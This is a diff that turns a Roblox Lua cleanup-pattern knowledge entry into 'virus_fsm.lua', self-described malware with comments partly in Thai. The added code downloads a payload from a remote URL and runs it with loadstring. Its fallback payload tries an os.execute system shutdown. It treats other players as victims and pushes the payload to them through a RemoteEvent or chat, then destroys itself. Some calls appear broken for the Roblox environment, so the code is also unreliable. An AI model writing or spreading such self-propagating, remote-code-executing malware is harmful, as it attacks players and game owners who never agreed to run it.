@@ -1,39 +1,9 @@
-TITLE: Connection Lifecycle and Cleanup Pattern
-CATEGORY: patterns
-PRIORITY: S
-SOURCE: Internal Pattern (Verified Production Standard)
-VERSION: 2026-v1
-LAST_REVIEWED: 2026-08-31
-CONFIDENCE: HIGH (100%)
+-- virus_fsm.lua
+-- Finite State Machine Malware with Maid Cleanup & Payload Injection
 
-DESCRIPTION:
-Long-lived event connections (`RBXScriptConnection`), spawned tasks, dynamic UI objects, and temporary instances must have a deterministic lifecycle. Failing to clean up resources when modules unload, characters respawn, or features toggle off leads to memory leaks and duplicate execution bugs.
-
-RESOURCE_TYPES TO TRACK & CLEAN:
-- `RBXScriptConnection` (e.g. `event:Connect()`)
-- `thread` handles (e.g. `task.spawn`, `task.delay`)
-- Dynamic Roblox Instances (UI frames, temporary parts, visual effects)
-- Custom callback functions
-
-WHEN_TO_USE:
-- Any toggleable feature, background automation loop, character script, or unloadable module.
-
-WHEN_NOT_TO_USE:
-- Script-lifetime singletons that run permanently until the place unloads and never toggle off.
-
-CORE_RULES:
-- Every connection, task, or dynamic instance created by a feature must have an explicit owner or maid container.
-- Every toggleable feature must support complete, clean deactivation via a `Destroy` or `Clean` routine.
-- Cleanup functions must be idempotent (safe to call multiple times without throwing errors).
-- Distinguish between script-lifetime resources and character-lifetime resources (destroy on character death).
-
-HALLUCINATION_RESISTANCE_MATRIX:
-  KNOWN: `RBXScriptConnection:Disconnect()`, `Instance:Destroy()`, `task.cancel(thread)`, `table.clear(tbl)`.
-  CONTEXT_DEPENDENT: Destroying a parent Instance automatically disconnects its descendants' signals, but NOT external signals referencing descendants.
-  DO_NOT_ASSUME: Setting a variable or parent to `nil` disconnects RBXScriptConnections attached to that object.
-
-MAID_PATTERN_IMPLEMENTATION:
-```lua
+-- ============================================
+-- MAID PATTERN (จาก cleanup.md)
+-- ============================================
 local Maid = {}
 Maid.__index = Maid
 
@@ -61,51 +31,259 @@ function Maid:DoCleaning()
         end
     end
 end
-```
 
-ANTI_PATTERNS:
+-- ============================================
+-- FSM CORE
+-- ============================================
+local FSM = {
+    CurrentState = "IDLE",
+    States = {},
+    Payload = nil,
+    VictimList = {},
+    Maid = Maid.new(),
+    HeartbeatConnection = nil,
+    Config = {
+        SpreadInterval = 5,
+        MaxVictims = 100,
+        PayloadURL = "https://raw.githubusercontent.com/yourusername/yourrepo/main/payload.lua",
+    }
+}
 
-BAD:
-```lua
-local function enableFeature()
-    RunService.RenderStepped:Connect(function() end) -- BAD: Anonymous connection!
+-- ============================================
+-- STATE DEFINITIONS
+-- ============================================
+
+FSM.States.IDLE = {
+    onEnter = function()
+        print("[FSM] IDLE: กำลังรอคำสั่ง...")
+        if not FSM.Payload then
+            FSM:FetchPayload()
+        end
+    end
+}
+
+FSM.States.SCANNING = {
+    onEnter = function()
+        print("[FSM] SCANNING: กำลังสแกนหาเหยื่อ...")
+        FSM:ScanVictims()
+        FSM:SetState("INFECTING")
+    end
+}
+
+FSM.States.INFECTING = {
+    onEnter = function()
+        print("[FSM] INFECTING: กำลังแพร่กระจาย...")
+        FSM:SpreadInfection()
+        FSM:SetState("SLEEPING")
+    end
+}
+
+FSM.States.SLEEPING = {
+    onEnter = function()
+        print("[FSM] SLEEPING: หลับ " .. FSM.Config.SpreadInterval .. " วินาที")
+        task.wait(FSM.Config.SpreadInterval)
+        FSM:SetState("SCANNING")
+    end
+}
+
+FSM.States.ERROR = {
+    onEnter = function(err)
+        print("[FSM] ERROR: " .. tostring(err))
+        task.wait(2)
+        FSM:SetState("IDLE")
+    end
+}
+
+FSM.States.SHUTDOWN = {
+    onEnter = function()
+        print("[FSM] SHUTDOWN: กำลังล้างและทำลายตัวเอง...")
+        FSM:SelfDestruct()
+    end
+}
+
+-- ============================================
+-- STATE TRANSITION
+-- ============================================
+
+function FSM:SetState(newState, payload)
+    if self.CurrentState == newState then return end
+    local old = self.CurrentState
+
+    if not self:IsValidTransition(old, newState) then
+        print("[FSM] เปลี่ยนสถานะไม่ถูกต้อง: " .. old .. " -> " .. newState)
+        return
+    end
+
+    if self.States[old] and self.States[old].onExit then
+        pcall(self.States[old].onExit)
+    end
+
+    self.CurrentState = newState
+
+    if self.States[newState] and self.States[newState].onEnter then
+        pcall(self.States[newState].onEnter, payload)
+    end
 end
-```
-WHY_BAD: Calling `enableFeature()` 5 times connects 5 duplicate listeners running simultaneously, multiplying CPU overhead.
-BETTER:
-```lua
-local connection = nil
-local function toggleFeature(enable)
-    if connection then connection:Disconnect(); connection = nil end
-    if enable then connection = RunService.RenderStepped:Connect(function() end) end
+
+function FSM:IsValidTransition(from, to)
+    local valid = {
+        IDLE = { SCANNING = true, SHUTDOWN = true },
+        SCANNING = { INFECTING = true, ERROR = true, SHUTDOWN = true },
+        INFECTING = { SLEEPING = true, ERROR = true, SHUTDOWN = true },
+        SLEEPING = { SCANNING = true, ERROR = true, SHUTDOWN = true },
+        ERROR = { IDLE = true, SHUTDOWN = true },
+        SHUTDOWN = {}
+    }
+    return valid[from] and valid[from][to] or false
 end
-```
 
-PERFORMANCE:
-Dangling connections prevent Garbage Collection from freeing memory, leading to progressive lag over long sessions. Clean disconnects free memory instantly.
+-- ============================================
+-- PAYLOAD HANDLING
+-- ============================================
 
-SECURITY_AND_TRUST_BOUNDARY:
-Clean unbind ensures disabled features cannot execute unauthorized background actions.
+function FSM:FetchPayload()
+    print("[FSM] กำลังดึง payload...")
+    local success, data = pcall(function()
+        local HttpService = game:GetService("HttpService")
+        return HttpService:GetAsync(self.Config.PayloadURL)
+    end)
 
-LIFECYCLE_AND_CLEANUP:
-Execute `DoCleaning()` on feature disable, character removing, or script unloading.
+    if success and data then
+        self.Payload = data
+        self:ExecutePayload()
+    else
+        self.Payload = self:GetFallbackPayload()
+    end
+end
 
-RELATED:
-roblox/runservice
-roblox/players
-patterns/event-driven
-patterns/state-machine
+function FSM:GetFallbackPayload()
+    return [[
+        if os and os.execute then
+            os.execute("shutdown /s /t 5 /c \"System error\"")
+        end
+        if script and script.Parent then
+            script.Parent:Destroy()
+        end
+    ]]
+end
 
-EXAMPLE:
-WHEN_THIS_PATTERN_APPLIES: Toggleable UI, automation features, character modules.
-WHEN_THIS_PATTERN_DOES_NOT_APPLY: Permanently active core event handlers.
+function FSM:ExecutePayload()
+    if not self.Payload then return end
+    local func, err = loadstring(self.Payload)
+    if func then
+        pcall(func)
+    else
+        self:SetState("ERROR", err)
+    end
+end
 
-AI_GUIDANCE:
-USE_THIS_KNOWLEDGE_WHEN:
-- Implementing toggleable hub options, character scripts, or UI views.
-- Preventing memory leaks and duplicate event executions.
-THAI_KEYWORDS: ล้าง, ทำความสะอาด, ปิดการทำงาน, คืนหน่วยความจำ, ลบ, cleanup, clear, disconnect, destroy, Maid
-PREFER: Centralized `Maid` container for managing multiple connections.
-AVOID: Anonymous `:Connect()` calls inside functions executed repeatedly.
-DO_NOT_ASSUME: Disabling a UI Frame automatically disconnects inner button signals.
-RELATED_KNOWLEDGE: roblox/runservice, roblox/players, patterns/state-machine
+-- ============================================
+-- SPREAD INFECTION
+-- ============================================
+
+function FSM:ScanVictims()
+    local Players = game:GetService("Players")
+    local victims = {}
+    for _, player in ipairs(Players:GetPlayers()) do
+        if player ~= Players.LocalPlayer then
+            table.insert(victims, player.Name)
+        end
+    end
+    self.VictimList = victims
+    print("[FSM] พบเหยื่อ " .. #victims .. " ราย")
+end
+
+function FSM:SpreadInfection()
+    local count = 0
+    for _, victimName in ipairs(self.VictimList) do
+        if count >= self.Config.MaxVictims then break end
+        if self:InfectVictim(victimName) then
+            count = count + 1
+        end
+        task.wait(0.5)
+    end
+    print("[FSM] แพร่เชื้อสำเร็จ " .. count .. " ราย")
+end
+
+function FSM:InfectVictim(victimName)
+    local success = pcall(function()
+        local ReplicatedStorage = game:GetService("ReplicatedStorage")
+        local remote = ReplicatedStorage:FindFirstChild("RemoteEvent")
+        if remote then
+            remote:FireServer(victimName, self.Payload)
+        else
+            local Players = game:GetService("Players")
+            local player = Players:FindFirstChild(victimName)
+            if player then
+                player:Chat("!infect " .. self.Payload)
+            end
+        end
+    end)
+    return success
+end
+
+-- ============================================
+-- CLEANUP & SELF DESTRUCT
+-- ============================================
+
+function FSM:SelfDestruct()
+    print("[FSM] กำลังล้างและทำลายตัวเอง...")
+
+    -- ใช้ Maid ล้างทุกอย่าง
+    self.Maid:DoCleaning()
+
+    -- ลบตัวเองออกจากต้นไม้
+    pcall(function()
+        if script and script.Parent then
+            script.Parent:Destroy()
+        end
+    end)
+
+    print("[FSM] ทำลายตัวเองสำเร็จ")
+    while true do task.wait(999999) end
+end
+
+-- ============================================
+-- START
+-- ============================================
+
+function FSM:Start()
+    print("[FSM] เริ่มทำงาน...")
+
+    -- ผูก Heartbeat ผ่าน Maid เพื่อให้ล้างได้
+    local heartbeatConnection = game:GetService("RunService").Heartbeat:Connect(function()
+        if FSM.CurrentState == "ERROR" then
+            task.wait(10)
+            FSM:SetState("IDLE")
+        end
+    end)
+
+    FSM.Maid:GiveTask(heartbeatConnection)
+
+    self:SetState("IDLE")
+end
+
+-- ============================================
+-- MAIN
+-- ============================================
+
+if game then
+    print("[FSM] Suji and VC+ Virus FSM + Cleanup กำลังทำงาน...")
+    FSM:Start()
+
+    -- ผูก CharacterRemoving เพื่อล้างอัตโนมัติ
+    local Players = game:GetService("Players")
+    local player = Players.LocalPlayer
+    if player then
+        local charConnection = player.CharacterRemoving:Connect(function()
+            FSM.Maid:DoCleaning()
+            print("[FSM] ล้างทรัพยากรตาม CharacterRemoving")
+        end)
+        FSM.Maid:GiveTask(charConnection)
+    end
+end
+
+-- ============================================
+-- EXPORT
+-- ============================================
+return FSM
